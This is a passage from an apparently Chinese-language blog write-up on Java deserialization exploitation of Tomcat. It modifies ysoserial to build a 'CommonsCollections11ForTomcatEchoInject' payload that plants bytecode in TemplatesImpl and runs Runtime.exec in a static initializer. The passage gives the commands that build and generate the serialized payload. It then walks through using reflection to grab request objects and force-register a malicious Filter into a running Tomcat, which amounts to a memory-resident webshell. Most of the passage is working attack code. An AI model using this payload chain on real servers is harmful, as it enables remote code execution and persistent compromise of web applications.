&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return createTemplatesImpl(command, c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">public static &lt;T&gt; T createTemplatesImpl ( final String command, Class c, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;final T templates = tplClass.newInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;final byte[] classBytes;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (c == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// use template gadget class</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ClassPool pool = ClassPool.getDefault();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pool.insertClassPath(new ClassClassPath(abstTranslet));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// run command in static initializer</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command.replaceAll(&quot;\\\\&quot;, &quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\&quot;);&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clazz.makeClassInitializer().insertAfter(cmd);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CtClass superC = pool.get(abstTranslet.getName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clazz.setSuperclass(superC);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;classBytes = clazz.toBytecode();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;classBytes = ClassFiles.classAsBytes(c);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// inject class bytes into instance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;classBytes, ClassFiles.classAsBytes(Foo.class)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;});</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// required to make TemplatesImpl happy</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return templates;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，第二个传入的</span><span class="cs8926E06">Class</span><span class="cs9C1B1871">参数，我们并没有用到</span><span class="cs8926E06">javassist</span><span class="cs9C1B1871">，而是直接转字节数组，然后放到</span><span class="cs8926E06">TemplatesImpl</span><span class="cs9C1B1871">实例的</span><span class="cs8926E06">_bytecodes</span><span class="cs9C1B1871">字段中了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后，回到</span><span class="cs8926E06">ysoserial</span><span class="cs9C1B1871">中有调用</span><span class="cs8926E06">Gadgets.createTemplatesImpl</span><span class="cs9C1B1871">的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">类中来，我这边对每一个都做了拷贝修改，例如</span><span class="cs8926E06">CommonsCollections11</span><span class="cs9C1B1871">，我拷贝其修改后的类为</span><span class="cs8926E06">CommonsCollections11ForTomcatEchoInject</span><span class="cs9C1B1871">，在调用</span><span class="cs9FB05234">Gadgets.createTemplatesImpl(command[0];</span><span class="cs9C1B1871">的地方，改成了</span><span class="cs9FB05234">final Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">并且，对</span><span class="cs8926E06">ysoserial</span><span class="cs9C1B1871">的</span><span class="cs8926E06">main</span><span class="cs9C1B1871">入口做一点小修改，因为原来的代码规定必须要有</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">的入参，而我们这里不需要了</span></p><p class="cs40DD2BC9"><span class="cs8926E06">ysoserial.GeneratePayload#main</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (args.length &lt; 1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;printUsage();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;System.exit(USAGE_CODE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">ysoserial</span><span class="cs9C1B1871">执行</span><span class="cs8926E06">maven</span><span class="cs9C1B1871">指令生成</span><span class="cs8926E06">jar</span><span class="cs9C1B1871">包</span></p><p class="cs3A447A38"><span class="cs9FB05234">mvn clean -Dmaven.test.skip=true compile assembly:assembly</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样，我们就能使用这个新的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">（</span><span class="cs8926E06">CommonsCollections11ForTomcatEchoInject</span><span class="cs9C1B1871">）了</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject &gt; ~/tmp/TomcatShellInject.ysoserial</span></p><h4 class="cs868C439D">
			<a name="步骤二"><span class="cs6EDCDAE2">步骤二</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在使用步骤一生成的序列化数据进行反序列化攻击后，我们就能通过下面这段代码获取到</span><span class="cs8926E06">request</span><span class="cs9C1B1871">和</span><span class="cs8926E06">response</span><span class="cs9C1B1871">对象了</span></p><p class="cs3A447A38"><span class="cs9FB05234">java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">f.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ThreadLocal t = (ThreadLocal) f.get(null);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">不为空则意味着第一次反序列化的准备工作已成功</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ServletRequest servletRequest = (ServletRequest) t.get()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着，我们要做的就是动态注册</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">到</span><span class="cs8926E06">tomcat</span><span class="cs9C1B1871">中，参考</span><span class="cs8926E06"><a class="cs508254C" href="https://www.jianshu.com/p/cbe1c3174d41"><span class="cs1C2E50E7">《动态注册之</span><span class="cs4B51D5E4">Servlet+Filter+Listener</span><span class="cs1C2E50E7">》</span></a></span><span class="cs9C1B1871">，可以看到，其中通过</span><span class="cs8926E06">ServletContext</span><span class="cs9C1B1871">对象（实际获取的是</span><span class="cs8926E06">ApplicationContext</span><span class="cs9C1B1871">，是</span><span class="cs8926E06">ServletContext</span><span class="cs9C1B1871">的实现，因为门面模式的使用，后面需要提取实际实现），实现了动态注册</span><span class="cs8926E06">Filter</span></p><p class="cs3A447A38"><span class="cs9FB05234">javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(&quot;threedr3am&quot;, threedr3am);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">filterRegistration.setInitParameter(&quot;encoding&quot;, &quot;utf-8&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">filterRegistration.setAsyncSupported(false);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{&quot;/*&quot;});</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然而实际上并不管用，为什么呢？</span></p><p class="cs3A447A38"><span class="cs9FB05234">private Dynamic addFilter(String filterName, String filterClass, Filter filter) throws IllegalStateException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (filterName != null &amp;&amp; !filterName.equals(&quot;&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new IllegalStateException(sm.getString(&quot;applicationContext.addFilter.ise&quot;, new Object[]{this.getContextPath()}));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FilterDef filterDef = this.context.findFilterDef(filterName);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (filterDef == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterDef = new FilterDef();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterDef.setFilterName(filterName);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.context.addFilterDef(filterDef);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (filterDef.getFilterName() != null &amp;&amp; filterDef.getFilterClass() != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (filter == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterDef.setFilterClass(filterClass);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterDef.setFilterClass(filter.getClass().getName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterDef.setFilter(filter);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new ApplicationFilterRegistration(filterDef, this.context);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new IllegalArgumentException(sm.getString(&quot;applicationContext.invalidFilterName&quot;, new Object[]{filterName}));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为</span><span class="cs9FB05234">this.context.getState()</span><span class="cs9C1B1871">在运行时返回的</span><span class="cs8926E06">state</span><span class="cs9C1B1871">已经是</span><span class="cs9FB05234">LifecycleState.STARTED</span><span class="cs9C1B1871">了，所以直接就抛异常了，</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">根本就添加不进去。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不过问题不大，因为</span><span class="cs9FB05234">this.context.getState()</span><span class="cs9C1B1871">获取的是</span><span class="cs8926E06">ServletContext</span><span class="cs9C1B1871">实现对象的</span><span class="cs8926E06">context</span><span class="cs9C1B1871">字段，从其中获取出</span><span class="cs8926E06">state</span><span class="cs9C1B1871">，那么，我们在其添加</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">前，通过反射设置成</span><span class="cs9FB05234">LifecycleState.STARTING_PREP</span><span class="cs9C1B1871">，在其顺利添加完成后，再把其恢复成</span><span class="cs9FB05234">LifecycleState.STARTE</span><span class="cs9C1B1871">，这里必须要恢复，要不然会造成服务不可用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其实上面的反射设置</span><span class="cs8926E06">state</span><span class="cs9C1B1871">值，也可以不做，因为我们看代码中，只是执行了</span><span class="cs9FB05234">this.context.addFilterDef(filterDef)</span><span class="cs9C1B1871">，我们完全也可以通过反射</span><span class="cs8926E06">context</span><span class="cs9C1B1871">这个字段自行添加</span><span class="cs8926E06">filterDef</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在实际执行栈中，可以看到，实际</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">的创建是在</span><span class="cs8926E06">org.apache.catalina.core.StandardWrapperValve#invoke</span><span class="cs9C1B1871">执行</span><span class="cs9FB05234">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><span class="cs9C1B1871">的地方</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进其实现方法，忽略不重要的代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">StandardContext context = (StandardContext) wrapper.getParent();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">FilterMap filterMaps[] = context.findFilterMaps();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// Add the relevant path-mapped filters to this filter chain</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for (int i = 0; i &lt; filterMaps.length; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!matchDispatcher(filterMaps[i] ,dispatcher)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!matchFiltersURL(filterMaps[i], requestPath))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;context.findFilterConfig(filterMaps[i].getFilterName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (filterConfig == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// FIXME - log configuration problem</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filterChain.addFilter(filterConfig);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，从</span><span class="cs8926E06">context</span><span class="cs9C1B1871">提取了</span><span class="cs8926E06">FilterMap</span><span class="cs9C1B1871">数组，并且遍历添加到</span><span class="cs8926E06">filterChain</span><span class="cs9C1B1871">，最终生效，但是这里有两个问题：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csFE4DF89B"><span class="cs9C1B1871">我们最早创建的</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">被封装成</span><span class="cs8926E06">FilterDef</span><span class="cs9C1B1871">添加到了</span><span class="cs8926E06">context</span><span class="cs9C1B1871">的</span><span class="cs8926E06">filterDefs</span><span class="cs9C1B1871">中，但是</span><span class="cs8926E06">filterMaps</span><span class="cs9C1B1871">中并不存在</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">跟上述一样的问题，也不存在</span><span class="cs8926E06">filterConfigs</span><span class="cs9C1B1871">中（</span><span class="cs9FB05234">context.findFilterConfig</span><span class="cs9C1B1871">是从</span><span class="cs8926E06">context</span><span class="cs9C1B1871">的</span><span class="cs8926E06">filterConfigs</span><span class="cs9C1B1871">中获取）</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这两个问题，也比较简单，第一个问题，其实在下面代码执行</span><span class="cs9FB05234">filterRegistration.addMappingForUrlPatterns</span><span class="cs9C1B1871">的时候已经添加进去了</span></p><p class="cs3A447A38"><span class="cs9FB05234">javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(&quot;threedr3am&quot;, threedr3am);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">filterRegistration.setInitParameter(&quot;encoding&quot;, &quot;utf-8&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">filterRegistration.setAsyncSupported(false);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{&quot;/*&quot;});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public void addMappingForUrlPatterns(EnumSet&lt;DispatcherType&gt; dispatcherTypes, boolean isMatchAfter, String... urlPatterns) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;FilterMap filterMap = new FilterMap();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filterMap.setFilterName(this.filterDef.getFilterName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (dispatcherTypes != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Iterator var5 = dispatcherTypes.iterator();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(var5.hasNext()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DispatcherType dispatcherType = (DispatcherType)var5.next();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterMap.setDispatcher(dispatcherType.name());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (urlPatterns != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String[] var9 = urlPatterns;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int var10 = urlPatterns.length;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(int var7 = 0; var7 &lt; var10; ++var7) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String urlPattern = var9[var7];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterMap.addURLPattern(urlPattern);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isMatchAfter) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.context.addFilterMap(filterMap);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.context.addFilterMapBefore(filterMap);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而第二个问题，既然没有，我们就反射加进去就行了，不过且先看看</span><span class="cs8926E06">StandardContext</span><span class="cs9C1B1871">，它有一个方法</span><span class="cs9FB05234">filterStart</span></p><p class="cs3A447A38"><span class="cs9FB05234">public boolean filterStart() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (this.getLogger().isDebugEnabled()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.getLogger().debug(&quot;Starting filters&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;boolean ok = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;synchronized(this.filterConfigs) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.filterConfigs.clear();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Iterator var3 = this.filterDefs.entrySet().iterator();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(var3.hasNext()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Entry&lt;String, FilterDef&gt; entry = (Entry)var3.next();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String name = (String)entry.getKey();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (this.getLogger().isDebugEnabled()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, (FilterDef)entry.getValue());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.filterConfigs.put(name, filterConfig);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable var8) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Throwable t = ExceptionUtils.unwrapInvocationTargetException(var8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExceptionUtils.handleThrowable(t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.getLogger().error(sm.getString(&quot;standardContext.filterStart&quot;, new Object[]{name}), t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> 